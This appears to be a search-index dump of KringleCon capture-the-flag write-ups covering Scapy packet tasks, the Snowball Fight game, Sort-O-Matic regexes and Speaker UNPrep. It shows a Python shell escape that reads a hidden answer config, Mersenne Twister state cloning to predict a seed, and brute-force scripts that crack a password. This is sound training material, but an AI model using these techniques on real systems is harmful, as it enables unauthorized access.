UDP_PACKETS[0][IP].dst = '127.0.0.1' >>> task.submit(UDP_PACKETS[0]) Submit the password task.submit('elf_password') of the user alabaster as found in the packet list TCP_PACKETS : >>> TCP_PACKETS.show() 0000 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp S 0001 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 SA 0002 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp A 0003 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw 0004 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw 0005 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw 0006 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw 0007 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw >>> [p[Raw].load for p in TCP_PACKETS if Raw in p] [b'220 North Pole FTP Server\\r\\n', b'USER alabaster\\r', b'331 Password required for alabas ter.\\r', b'PASS echo\\r\\n', b'230 User alabaster logged in.\\r'] >>> task.submit('echo') The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list. >>> ICMP_PACKETS.show() 0000 Ether / IP / ICMP 10.2.2.123 > 10.21.23.12 echo-request 0 / Raw 0001 Ether / IP / ICMP 10.21.23.12 > 10.21.23.12 echo-reply 0 / Raw 0002 Ether / IP / ICMP 10.2.2.123 > 10.21.23.12 echo-request 0 / Raw 0003 Ether / IP / ICMP 10.21.23.12 > 10.21.23.12 echo-reply 0 / Raw >>> ICMP_PACKETS[1][ICMP] <ICMP type=echo-reply code=0 chksum=0x4c44 id=0x6d38 seq=0x1 unused='' |<Raw load='L=\\xa 7^\\x00\\x00\\x00\\x00\\x88\\x13\\x0c\\x00\\x00\\x00\\x00\\x00\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19 \\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !\"#$%&\\'()*+,-./01234567' |>> >>> task.submit(0x4c44) Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named \"pkt\" ```` pkt = Ether(src='127.0.0.1')/ICMP(type=\"echo-request\") pkt = IP(src='127.0.0.1')/ICMP(type=\"echo-reply\") pkt = IP(dst='127.0.0.1')/ICMP(type=\"echo-request\") ``` : task.submit(3)` Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified) >>> l3 = IP(dst='127.127.127.127') >>> l4 = UDP(dport=5000) >>> packet = l3/l4 >>> task.submit(packet) Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of \"elveslove.santa\". (all other packet attributes can be unspecified) >>> l3 = IP(dst='127.2.3.4') >>> l4 = UDP(dport=53) >>> l7 = DNS(qd=DNSQR(qname='elveslove.santa')) >>> packet = l3/l4/l7 >>> task.submit(packet) The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection. >>> ARP_PACKETS.show() 0000 Ether / ARP who has 192.168.0.1 says 192.168.0.114 0001 Ether / ARP None 192.168.0.1 > 192.168.0.114 / Padding >>> ARP_PACKETS[1][ARP] <ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0. 1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding load='\\xc0\\xa8\\x00r' |>> >>> ARP_PACKETS[1][ARP].op = 2 # reply >>> ARP_PACKETS[1][ARP].hwdst = ARP_PACKETS[0][ARP].hwsrc >>> ARP_PACKETS[1][Ether] <Ether dst=00:16:ce:6e:8b:24 src=00:13:46:0b:22:ba type=ARP |<ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=00:16:ce:6e:8b:24 p dst=192.168.0.114 |<Padding load='\\xc0\\xa8\\x00r' |>>> >>> ARP_PACKETS[1][ARP].hwsrc = ARP_PACKETS[1][Ether].src >>> task.submit(ARP_PACKETS) Great, you prepared all the present packets! Congratulations, all pretty present packets properly prepared for processing! /bin/bash: /home/elf/runtoanswer: No such file or directory","title":"Solution"},{"location":"challenges/terminal-challenges/scapy-prepper/#fun-fact","text":"The python shell is not secure: Great, you prepared all the present packets! Congratulations, all pretty present packets properly prepared for processing! /bin/bash: /home/elf/runtoanswer: No such file or directory >>> import os; os.system('/bin/bash') elf@e5204f3baace:~$ ll total 28 drwxr-xr-x 1 elf elf 4096 Jan 6 04:28 ./ drwxr-xr-x 1 root root 4096 Dec 6 12:27 ../ -rw-r--r-- 1 elf elf 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 elf elf 3770 Dec 5 00:00 .bashrc drwxr-xr-x 3 elf elf 4096 Jan 6 04:28 .cache/ -rw-r--r-- 1 elf elf 807 Apr 4 2018 .profile elf@e5204f3baace:~$ find / -name *runtoanswer* 2>/dev/null /etc/runtoanswer.yaml elf@e5204f3baace:~$ file /etc/runtoanswer.yaml /etc/runtoanswer.yaml: ASCII text elf@e5204f3baace:~$ cat /etc/runtoanswer.yaml # This is the config file for runtoanswer, where you can set up your challenge! --- # This is the completionSecret from the Content sheet - don't tell the user this! key: f8faa6e627ad475fb0ef040a8c972a01 # The answer that the user is expected to enter - case sensitive answer: \"5549680958006376\" # A prompt that is displayed if the user runs this interactively (they might # not see this - answers can be entered as an argument) prompt: \"What is the answer?\\n> \" # Optional: a time, in seconds, to delay before validating the answer (to # prevent guessing) # delay: 5elf@e5204f3baace:~$","title":"Fun fact"},{"location":"challenges/terminal-challenges/snowball-fight/","text":"Snowball Fight Challenge Solution Since the goal is to beat the game's Impossible level, and since Tangle Coalbox informed us that it is possible to beat Impossible by feeding in the Impossible level's generated player name into the Easy level's player name field, we need to figure out how the Impossible level names are generated. The plan is to use the Hard level to see how the numbers are generated to predict how the Impossible level generates player names after throwing \"away hundreds of random names before starting\". We're given the hint that the name generation is related to Mersenne twisters. Mersenne Twisters From Tom Liston's \"Random Facts about Mersenne Twisters\" . Most widely used implementation of the Mersenne Twister is MT-19937 Has a period of 2^19937 - 1 Passes most tests for statistical randomness 32-bit version (most widely used) of MT-19937 uses 624 32-bit integers to keep track of current state of array Each integer from the array is incrementally passed through a \"tempering\" function for statistical randomness The tempering function is reversible, allowing us to re-create the state array with the generated 624 random values and thus clone the PRNG After using all 624 integers in the array, it performs an algorithmic transform on the array Snowball Fight Name Generation Let's first figure out what kinds of names the game generates by starting the Hard level a bunch of times. 1597741866 751787933 3645162962 80457558 3429068149 2897193692 560135494 2395935296 3724407282 2593925577 1615633108 2168509203 137887793 1069172728 708630780 So far, with this small sample size, it appears that the name generator is returning unsigned 32-bit integers. We can assume so since there are no 10-digit return values greater than 2^32 - 1. Now we can use a mt19937 predictor tool, but I don't feel like clicking the game's interface 624 times to gather enough numbers to untemper for cloning. Assuming that the kringlecon creators don't require us to do so as well, there's probably a vulnerability in the game that let's us find the hundreds of discarded generated numbers when playing on Impossible. Entering an Impossible level returns POST request to https://snowball2.kringlecastle.com/game with payload: difficulty=3&playerID=003480ec-4a4b-4e50-8943-c73ae664c6f9 GET request to https://snowball2.kringlecastle.com/static/snowstyle.css GET request to https://snowball2.kringlecastle.com/static/battlefort.js GET request to wss://snowball2.kringlecastle.com/ws The POST response payload contains a comment of the attempted seeds. Therefore, we can use the keep POST ing with difficulty=3&playerID=[generated_id_here] until we get 624 numbers to untemper for cloning mt19937. Conveniently, the POST request payload contains exactly 624 numbers. So we can just save the numbers into a file to use for cloning the Mersenne twister state array. root@kali:~/kringlecon20/challenges/snowball-fight/code# wc nums.txt 624 624 6723 nums.txt Now let's use the mersenne-twister-predictor root@kali:~/kringlecon20/challenges/snowball-fight/code# python3 -m venv venv root@kali:~/kringlecon20/challenges/snowball-fight/code# source venv/bin/activate root@kali:~/kringlecon20/challenges/snowball-fight/code# pip install mersenne-twister-predictor Since the POST request generates 625 numbers, skipping the first 624 and redacting the 625th number as the Impossible level's player name, the first number the cloned PRNG generates should be the redacted number. We can input the number as the username on an additional instance of the game. # nextnum.py # quick script that predicts a Mersenne twister and passes the # next value as the seed to a PRNG import random from mt19937predictor import MT19937Predictor predictor = MT19937Predictor() with open('nums.txt', 'r') as file: for line in file: predictor.setrand_int32(int(line)) print(predictor.getrandbits(32)) root@kali:~/kringlecon20/challenges/snowball-fight/code# python nextnum.py 3135941721 Inserting the generated number into the username field for the Easy instance of the game generates an identical board. We can then just use the Easy instance to find all the right coordinates to select for the Impossible instance Easy instance: Impossible instance: Victory page:","title":"Terminal/Snowball Fight"},{"location":"challenges/terminal-challenges/snowball-fight/#snowball-fight","text":"","title":"Snowball Fight"},{"location":"challenges/terminal-challenges/snowball-fight/#challenge","text":"","title":"Challenge"},{"location":"challenges/terminal-challenges/snowball-fight/#solution","text":"Since the goal is to beat the game's Impossible level, and since Tangle Coalbox informed us that it is possible to beat Impossible by feeding in the Impossible level's generated player name into the Easy level's player name field, we need to figure out how the Impossible level names are generated. The plan is to use the Hard level to see how the numbers are generated to predict how the Impossible level generates player names after throwing \"away hundreds of random names before starting\". We're given the hint that the name generation is related to Mersenne twisters.","title":"Solution"},{"location":"challenges/terminal-challenges/snowball-fight/#mersenne-twisters","text":"From Tom Liston's \"Random Facts about Mersenne Twisters\" . Most widely used implementation of the Mersenne Twister is MT-19937 Has a period of 2^19937 - 1 Passes most tests for statistical randomness 32-bit version (most widely used) of MT-19937 uses 624 32-bit integers to keep track of current state of array Each integer from the array is incrementally passed through a \"tempering\" function for statistical randomness The tempering function is reversible, allowing us to re-create the state array with the generated 624 random values and thus clone the PRNG After using all 624 integers in the array, it performs an algorithmic transform on the array","title":"Mersenne Twisters"},{"location":"challenges/terminal-challenges/snowball-fight/#snowball-fight-name-generation","text":"Let's first figure out what kinds of names the game generates by starting the Hard level a bunch of times. 1597741866 751787933 3645162962 80457558 3429068149 2897193692 560135494 2395935296 3724407282 2593925577 1615633108 2168509203 137887793 1069172728 708630780 So far, with this small sample size, it appears that the name generator is returning unsigned 32-bit integers. We can assume so since there are no 10-digit return values greater than 2^32 - 1. Now we can use a mt19937 predictor tool, but I don't feel like clicking the game's interface 624 times to gather enough numbers to untemper for cloning. Assuming that the kringlecon creators don't require us to do so as well, there's probably a vulnerability in the game that let's us find the hundreds of discarded generated numbers when playing on Impossible. Entering an Impossible level returns POST request to https://snowball2.kringlecastle.com/game with payload: difficulty=3&playerID=003480ec-4a4b-4e50-8943-c73ae664c6f9 GET request to https://snowball2.kringlecastle.com/static/snowstyle.css GET request to https://snowball2.kringlecastle.com/static/battlefort.js GET request to wss://snowball2.kringlecastle.com/ws The POST response payload contains a comment of the attempted seeds. Therefore, we can use the keep POST ing with difficulty=3&playerID=[generated_id_here] until we get 624 numbers to untemper for cloning mt19937. Conveniently, the POST request payload contains exactly 624 numbers. So we can just save the numbers into a file to use for cloning the Mersenne twister state array. root@kali:~/kringlecon20/challenges/snowball-fight/code# wc nums.txt 624 624 6723 nums.txt Now let's use the mersenne-twister-predictor root@kali:~/kringlecon20/challenges/snowball-fight/code# python3 -m venv venv root@kali:~/kringlecon20/challenges/snowball-fight/code# source venv/bin/activate root@kali:~/kringlecon20/challenges/snowball-fight/code# pip install mersenne-twister-predictor Since the POST request generates 625 numbers, skipping the first 624 and redacting the 625th number as the Impossible level's player name, the first number the cloned PRNG generates should be the redacted number. We can input the number as the username on an additional instance of the game. # nextnum.py # quick script that predicts a Mersenne twister and passes the # next value as the seed to a PRNG import random from mt19937predictor import MT19937Predictor predictor = MT19937Predictor() with open('nums.txt', 'r') as file: for line in file: predictor.setrand_int32(int(line)) print(predictor.getrandbits(32)) root@kali:~/kringlecon20/challenges/snowball-fight/code# python nextnum.py 3135941721 Inserting the generated number into the username field for the Easy instance of the game generates an identical board. We can then just use the Easy instance to find all the right coordinates to select for the Impossible instance Easy instance: Impossible instance: Victory page:","title":"Snowball Fight Name Generation"},{"location":"challenges/terminal-challenges/sort-o-matic/","text":"Sort-O-Matic Challenge Solution Matches at least one digit: \\d+ Matches 3 alpha a-z characters ignoring case: [a-zA-Z]{3} Matches 2 chars of lowercase a-z or numbers: [a-z0-9]{2} Matches any 2 chars not uppercase A-L or 1-5: [^A-L1-5]{2} Matches three or more digits only: ^\\d{3,}$ Matches multiple hour:minute:second time formats only: ^([0-1]?[0-9]|2[0-4]):([0-5][0-9]):([0-5][0-9])$ Matches MAC address format only while ignoring case: ^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$ Matches multiple day, month, and year date formats only: ^([0-2][0-9]|3[0-1])(\\/|\\.|-)(0[1-9]|1[0-2])(\\/|\\.|-)(\\d{4})$","title":"Terminal/Sort-O-Matic"},{"location":"challenges/terminal-challenges/sort-o-matic/#sort-o-matic","text":"","title":"Sort-O-Matic"},{"location":"challenges/terminal-challenges/sort-o-matic/#challenge","text":"","title":"Challenge"},{"location":"challenges/terminal-challenges/sort-o-matic/#solution","text":"Matches at least one digit: \\d+ Matches 3 alpha a-z characters ignoring case: [a-zA-Z]{3} Matches 2 chars of lowercase a-z or numbers: [a-z0-9]{2} Matches any 2 chars not uppercase A-L or 1-5: [^A-L1-5]{2} Matches three or more digits only: ^\\d{3,}$ Matches multiple hour:minute:second time formats only: ^([0-1]?[0-9]|2[0-4]):([0-5][0-9]):([0-5][0-9])$ Matches MAC address format only while ignoring case: ^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$ Matches multiple day, month, and year date formats only: ^([0-2][0-9]|3[0-1])(\\/|\\.|-)(0[1-9]|1[0-2])(\\/|\\.|-)(\\d{4})$","title":"Solution"},{"location":"challenges/terminal-challenges/speaker-unprep/","text":"Speaker UNPrep Shell Help us get into the Speaker Unpreparedness Room! The door is controlled by ./door, but it needs a password! If you can figure out the password, it'll open the door right up! Oh, and if you have extra time, maybe you can turn on the lights with ./lights activate the vending machines with ./vending-machines? Those are a little trickier, they have configuration files, but it'd help us a lot! (You can do one now and come back to do the others later if you want) We copied edit-able versions of everything into the ./lab/ folder, in case you want to try EDITING or REMOVING the configuration files to see how the binaries react. Note: These don't require low-level reverse engineering, so you can put away IDA and Ghidra (unless you WANT to use them!) elf@bfa5a25732b3 ~ $ Solution Let's see what's available to us: elf@bfa5a25732b3 ~ $ ls -alt total 852 drwxr-xr-x 1 root root 4096 Dec 3 20:43 . drwxr-xr-x 1 elf elf 4096 Dec 3 20:43 .local drwxr-xr-x 1 elf elf 4096 Dec 3 20:43 lab drwxr-xr-x 1 root root 4096 Dec 3 20:41 .. -rwxr-xr-x 1 root root 231728 Dec 1 19:19 door -rwxr-xr-x 1 root root 276784 Dec 1 19:19 lights -rwxr-xr-x 1 root root 321840 Dec 1 19:19 vending-machines -rw-r--r-- 1 root root 102 Oct 1 17:37 .bashrc -rw-r--r-- 1 root root 92 Oct 1 17:37 lights.conf -rw-r--r-- 1 root root 59 Oct 1 17:37 vending-machines.json -rw-r--r-- 1 elf elf 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 elf elf 807 Apr 18 2019 .profile elf@bfa5a25732b3 ~ $ Door elf@bfa5a25732b3 ~ $ file door door: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpre ter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4973fb994a1038936fd611 1fa1e01d95f052a1dd, stripped elf@bfa5a25732b3 ~ $ ./door You look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter? > Since the password is stored in the binary, we can just search the strings in the binary elf@bfa5a25732b3 ~ $ strings door | grep -i pass /home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a Be sure to finish the challenge in prod: And don't forget, the password is \"Op3nTheD00r\" Beep boop invalid password elf@bfa5a25732b3 ~ $ flag : Op3nTheD00r Lights elf@bdd3e4aedbaf ~ $ file lights lights: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interp reter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5bd84970c7dc4ca56105 234dda82c961a3677143, stripped elf@bdd3e4aedbaf ~ $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter? > We can check the lights.conf file for a password elf@bdd3e4aedbaf ~ $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician Then try to pass in the given password value to the interactive prompt elf@bdd3e4aedbaf ~ $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter? > E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 Checking...... Beep boop invalid password elf@bdd3e4aedbaf ~ $ Looks like the password is encrypted, but the username is decrypted due to the message, \"CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED.\" So let's switch the username and password keys in the lights.conf file to see if the program can decrypt the password value for us. elf@4f561142e32b ~/lab $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician elf@4f561142e32b ~/lab $ vim lights.conf elf@4f561142e32b ~/lab $ cat lights.conf name: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 password: elf-technician elf@4f561142e32b ~/lab $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, Computer-TurnLightsOn What do you enter? > Computer-TurnLightsOn Checking...... Beep boop invalid password elf@4f561142e32b ~/lab $ vim lights.conf elf@4f561142e32b ~/lab $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician elf@4f561142e32b ~/lab $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter? > Computer-TurnLightsOn Checking...... That would have turned on the lights! If you've figured out the real password, be sure you run /home/elf/lights elf@4f561142e32b ~/lab $ Let's try it on prod elf@4f561142e32b ~ $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter? > Computer-TurnLightsOn Checking...... Lights on! elf@4f561142e32b ~ $ flag: Computer-TurnLightsOn Vending Machines elf@35af65fe84ed ~/lab $ file vending-machines vending-machines: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically link ed, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=23634d9cce f73f0676a5247d302084267fa92f79, stripped elf@35af65fe84ed ~/lab $ ./vending-machines The elves are hungry! If the door's still closed or the lights are still off, you know because you can hear them complaining about the turned-off vending machines! You can probably make some friends if you can get them back on... Loading configuration from: /home/elf/lab/vending-machines.json I wonder what would happen if it couldn't find its config file? Maybe that's something you could figure out in the lab... Welcome, elf-maintenance! It looks like you want to turn the vending machines back on? Please enter the vending-machine-back-on code > test Checking...... Beep boop invalid password elf@35af65fe84ed ~/lab $ Let's start removing the config file, as recommended elf@35af65fe84ed ~/lab $ cat vending-machines.json { \"name\": \"elf-maintenance\", \"password\": \"LVEdQPpBwr\" }elf@35af65fe84ed ~/lab $ rm vending-machines.json elf@35af65fe84ed ~/lab $ ./vending-machines The elves are hungry! If the door's still closed or the lights are still off, you know because you can hear them complaining about the turned-off vending machines! You can probably make some friends if you can get them back on... Loading configuration from: /home/elf/lab/vending-machines.json I wonder what would happen if it couldn't find its config file? Maybe that's something you could figure out in the lab... ALERT! ALERT! Configuration file is missing! New Configuration File Creator Activated! Please enter the name > test Please enter the password > foobar Welcome, test! It looks like you want to turn the vending machines back on? Please enter the vending-machine-back-on code > temp-code Checking...... Beep boop invalid password elf@35af65fe84ed ~/lab $ ls -lt total 824 -rw-r--r-- 1 elf elf 44 Jan 4 02:54 vending-machines.json -rwxr-xr-x 1 elf elf 231728 Dec 3 20:43 door -rwxr-xr-x 1 elf elf 276784 Dec 3 20:43 lights -rw-r--r-- 1 elf elf 92 Dec 3 20:43 lights.conf -rwxr-xr-x 1 elf elf 321840 Dec 3 20:43 vending-machines elf@35af65fe84ed ~/lab $ cat vending-machines.json { \"name\": \"test\", \"password\": \"8jfBam\" }elf@35af65fe84ed ~/lab $ It looks as though removing the .json makes the vending-machine executable create a new file with the given name and password. Since we're not able to make any modifications to the prod .json, we can use this new-file-creation feature to find determine what encryption algorithm encrypts the password. Let encryption function E_k: P -> C where P = plaintext space, C = ciphertext space, k = key ================================= p \\in P | c \\in C --------------------------------- A | X AA | Xi AB | Xq A1 | Xr AAA | XiG AAAA | XiGR AAAAA | XiGRe AAAAAA | XiGReh BAAAAA | DiGReh AAAAAAA | XiGRehm AAAAAAAAAAAAAAA | XiGRehmwXiGRehm Since each additional plaintext character yields a corresponding additional ciphertext character, we know that the cipher operates on 1-byte blocks, suggesting a stream cipher like RC4 or Salsa20. Additionally, since changing the first plaintext character only changes the first ciphertext byte, we can determine that the algorithm is using electronic codebook (ECB) mode encryption. Therefore, the plaintext of LVEdQPpBwr is 10 characters long and is easily bruteforceable as we can test each character sequentially. Before bruteforcing, let's see if we can generate a wordlist of 10-character long strings associated with elf-maintenance . # Elf names Shortstack shortstack Bonbowford bonbowford Sappington sappington Ninecandle ninecandle # Associated terms Kringlecon kringlecon and perform a dictionary attack with the following quick script elf@da7e515c9976 ~/lab $ touch dict-attack.sh elf@da7e515c9976 ~/lab $ vim dict-attack.sh elf@da7e515c9976 ~/lab $ chmod u+x dict-attack.sh elf@da7e515c9976 ~/lab $ cat dict-attack.sh #!/bin/bash WORDS=$(cat wordlist.txt) for WORD in $WORDS do echo \"performing attack with payload: $WORD\" touch input.txt echo \"username\" > input.txt echo $WORD >> input.txt echo \"temp-code\" >> input.txt rm vending-machines.json cat input.txt | ./vending-machines > /dev/null if [ ! -f ./outputs.txt ]; then touch outputs.txt fi echo \"$WORD:$(cat vending-machines.json)\" >> outputs.txt done elf@da7e515c9976 ~/lab $ elf@da7e515c9976 ~/lab $ ./dict-attack.sh performing attack with payload: Shortstack performing attack with payload: shortstack performing attack with payload: Bonbowford performing attack with payload: bonbowford performing attack with payload: Sappington performing attack with payload: sappington performing attack with payload: Ninecandle performing attack with payload: ninecandle performing attack with payload: Kringlecon performing attack with payload: kringlecon elf@da7e515c9976 ~/lab $ cat outputs.txt Shortstack:{ \"name\": \"username\", \"password\": \"4nfydSTge6\" } shortstack:{ \"name\": \"username\", \"password\": \"AnfydSTge6\" } Bonbowford:{ \"name\": \"username\", \"password\": \"DjEBhK5c5R\" } bonbowford:{ \"name\": \"username\", \"password\": \"GjEBhK5c5R\" } Sappington:{ \"name\": \"username\", \"password\": \"4VM54XfNRh\" } sappington:{ \"name\": \"username\", \"password\": \"AVM54XfNRh\" } Ninecandle:{ \"name\": \"username\", \"password\": \"Z0EQ6cDbfc\" } ninecandle:{ \"name\": \"username\", \"password\": \"b0EQ6cDbfc\" } Kringlecon:{ \"name\": \"username\", \"password\": \"FNs6PsuRRh\" } kringlecon:{ \"name\": \"username\", \"password\": \"oNs6PsuRRh\" } elf@da7e515c9976 ~/lab $ So the first dictionary attack didn't give us anything except the following characters in the plaintext password: _ a n _ _ _ _ _ _ _ . Since the first character is neither S nor s , the first few characters are not Santa , but can be C / candycanes . Will just quickly check that out to see if it works. Candycanes:{ \"name\": \"username\", \"password\": \"LVEdQEpBw5\" } candycanes:{ \"name\": \"username\", \"password\": \"eVEdQEpBw5\" } The Candycanes payload is pretty close to the ciphertext we're trying to crack: LVEdQPpBwr . Therefore, we know that the plaintext is: C a n d y _ a n e _ . We can then bruteforce the missing blanks to see what the plaintext is. We start with bruteforcing the first character we don't know with the following script, where charlist.txt is a wordlist containing alphabet chars: elf@5b32c1cf8624 ~/lab $ vim bruteforce.sh elf@5b32c1cf8624 ~/lab $ cat bruteforce.sh #!/bin/bash CHARS=$(cat charlist.txt) for CHAR in $CHARS do echo \"performing attack with payload: $CHAR\" touch input.txt echo \"username\" > input.txt echo \"Candy${CHAR}ane\" >> input.txt echo \"temp-code\" >> input.txt rm vending-machines.json cat input.txt | ./vending-machines > /dev/null OUTPUT=$(cat vending-machines.json | python -c \\ 'import json,sys;obj=json.load(sys.stdin);print obj[\"password\"]') if [[ \"$OUTPUT\" == \"LVEdQPpBw\" ]]; then echo \"Found: Candy${CHAR}ane -- $OUTPUT\" break fi done elf@5b32c1cf8624 ~/lab $ elf@5b32c1cf8624 ~/lab $ ./bruteforce.sh performing attack with payload: t performing attack with payload: y performing attack with payload: u performing attack with payload: i performing attack with payload: o performing attack with payload: p performing attack with payload: a performing attack with payload: s performing attack with payload: d performing attack with payload: f performing attack with payload: g performing attack with payload: h performing attack with payload: j performing attack with payload: k performing attack with payload: l performing attack with payload: z performing attack with payload: x performing attack with payload: c performing attack with payload: v performing attack with payload: b performing attack with payload: n performing attack with payload: m performing attack with payload: Q performing attack with payload: W performing attack with payload: E performing attack with payload: R performing attack with payload: T performing attack with payload: Y performing attack with payload: U performing attack with payload: I performing attack with payload: O performing attack with payload: P performing attack with payload: A performing attack with payload: S performing attack with payload: D performing attack with payload: F performing attack with payload: G performing attack with payload: H performing attack with payload: J performing attack with payload: K performing attack with payload: L performing attack with payload: Z performing attack with payload: X performing attack with payload: C Found: CandyCane -- LVEdQPpBw elf@5b32c1cf8624 ~/lab $ And we modify the bruteforce.sh script with the found C to find the final unknown character elf@5b32c1cf8624 ~/lab $ vim bruteforce.sh elf@5b32c1cf8624 ~/lab $ cat bruteforce.sh #!/bin/bash CHARS=$(cat charlist.txt) for CHAR in $CHARS do echo \"performing attack with payload: $CHAR\" touch input.txt echo \"username\" > input.txt echo \"CandyCane${CHAR}\" >> input.txt echo \"temp-code\" >> input.txt rm vending-machines.json cat input.txt | ./vending-machines > /dev/null OUTPUT=$(cat vending-machines.json | python -c \\ 'import json,sys;obj=json.load(sys.stdin);print obj[\"password\"]') if [[ \"$OUTPUT\" == \"LVEdQPpBwr\" ]]; then echo \"Found: CandyCane${CHAR} -- $OUTPUT\" break fi done elf@5b32c1cf8624 ~/lab $ Nothing was found, so let's bruteforce the final character with numbers and symbols ( numsymlist.txt is a wordlist of numbers and symbols): ```bashelf@5b32c1cf8624 ~/lab $ vim bruteforce.sh elf@5b32c1cf8624 ~/lab $ cat bruteforce.sh !/bin/bash CHARS=$(cat numsymlist.txt) for CHAR in $CHARS do echo \"performing attack with payload: $CHAR\" touch input.txt echo \"username\" > input.txt echo \"CandyCane${CHAR}\" >> input.txt echo \"temp-code\" >> input.txt rm vending-machines.json cat input.txt | ./vending-machines > /dev/null OUTPUT=$(cat vending-machines.json | python -c \\ 'import json,sys;obj=json.load(sys.stdin);print obj[\"password\"]') if [[ \"$OUTPUT\" == \"LVEdQPpBwr\" ]]; then echo \"Found: CandyCane${CHAR} -- $OUTPUT\" break fi done elf@5b32c1cf8624 ~/lab $ ```bash elf@5b32c1cf8624 ~/lab $ ./bruteforce.sh performing attack with payload: 1 Found: CandyCane1 -- LVEdQPpBwr elf@5b32c1cf8624 ~/lab $ Et voil\u00e0! Let's try out CandyCane1 elf@5b32c1cf8624 ~ $ ./vending-machines The elves are hungry! If the door's still closed or the lights are still off, you know because you can hear them complaining about the turned-off vending machines! You can probably make some friends if you can get them back on... Loading configuration from: /home/elf/vending-machines.json I wonder what would happen if it couldn't find its config file? Maybe that's something you could figure out in the lab... Welcome, elf-maintenance! It looks like you want to turn the vending machines back on? Please enter the vending-machine-back-on code > CandyCane1 Checking...... Vending machines enabled!! elf@5b32c1cf8624 ~ $ flag: CandyCane1","title":"Terminal/Speaker Unprep"},{"location":"challenges/terminal-challenges/speaker-unprep/#speaker-unprep","text":"","title":"Speaker UNPrep"},{"location":"challenges/terminal-challenges/speaker-unprep/#shell","text":"Help us get into the Speaker Unpreparedness Room! The door is controlled by ./door, but it needs a password! If you can figure out the password, it'll open the door right up! Oh, and if you have extra time, maybe you can turn on the lights with ./lights activate the vending machines with ./vending-machines? Those are a little trickier, they have configuration files, but it'd help us a lot! (You can do one now and come back to do the others later if you want) We copied edit-able versions of everything into the ./lab/ folder, in case you want to try EDITING or REMOVING the configuration files to see how the binaries react. Note: These don't require low-level reverse engineering, so you can put away 